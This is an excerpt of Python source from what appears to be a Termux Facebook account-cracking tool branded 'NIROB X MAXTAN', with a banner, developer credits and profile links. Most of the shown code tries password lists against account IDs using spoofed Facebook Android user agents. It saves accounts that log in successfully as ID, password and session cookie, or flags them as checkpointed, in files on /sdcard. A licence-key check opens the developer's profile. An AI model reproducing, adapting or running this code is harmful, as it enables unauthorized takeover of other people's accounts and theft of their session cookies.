...
╚═╝░░╚══╝╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░
\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mDEVELOPER \x1b[1;91m :   \x1b[1;92mNIROB-VAU X XISHAN
\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mFACEBOOK \x1b[1;91m  :   \x1b[1;92mALvee Nirob / MAXTAN XISHAN
\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mFILE RANDOM
...
def menu():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100004828350261/')
        menu()
    elif select == '0':
...
#        ua = f"[FBAN/FB4A;FBAV/{str(random.randint(11, 77))}.0.0.{str(random.randrange(9, 49))}{str(random.randint(11, 77))};FBBV/{str(random.randint(1111111, 7777777))};'[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Robi;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
        ...
        for pw in psw:
            ...
            with requests.Session() as session:
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\r{G1}[NIROB X MAXTAN-OK] {sid} | {ps} ')
                    open('/sdcard/NIROBxMAXTAN -M1-FILE-OK.txt', 'a').write(f'{sid}|{ps}|{cookie}\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f'\r\r{M}[NIROB X MAXTAN-CP] {sid} | {ps} ')
                    open('/sdcard/NIROBxMAXTAN -M2-FILE-OK.txt', 'a').write(f'{sid}|{ps}\n')
                    cps.append(sid)
                    break
                else:
                    continue
    ...
    def methodB(self, sid, name, psw):
        sys.stdout.write(f"\r{G1}[{A}NIROBxMAXTAN-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
        sys.stdout.flush()
        try:
            fs = name.split(' ')[0]
            ls = name.split(' ')[1]
        ...
        for pw in psw:
            ...
            with requests.Session() as session:
                ...
                if 'session_key' in q:
                    ...
                    cookie = f"sb={swagb};{ckkk}"
                    print(f'\r\r{G1}[NIROB X MAXTAN-OK] {sid} | {ps} ')
                    open('/sdcard/NIROBxMAXTAN-M2-FILE-OK.txt', 'a').write(f'{sid}|{ps}|{cookie}\n')
                    oks.append(sid)
                    return
                elif 'www.facebook.com' in q['error']['message']:
                    print(f'\r\r{M}[NIROB X MAXTAN-CP] {sid} | {ps} ')
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                print(f'\r\r{G1}[NIROB X MAXTAN-OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{A} {coki}')
                open('/sdcard/NIROBxMAXTAN-OK.txt', 'a').write(f'{uid}|{pas}|{coki}\n')
                ok.append(uid)
                break
            else:
                continue
...
K1 = str(os.getuid())
K2 = str(os.getgid())
num_key = 'NIROB X MAXTAN'.join(K1 + K2).upper()
...
def apv():
    ...
    try:
        ...
        if num_key in datax:
            ...
            print(" !! Key - " + num_key)
            os.system('termux-open https://www.facebook.com/profile.php?id=100004828350261/')
            sys.exit()
    except Exception as e:
        print(e)
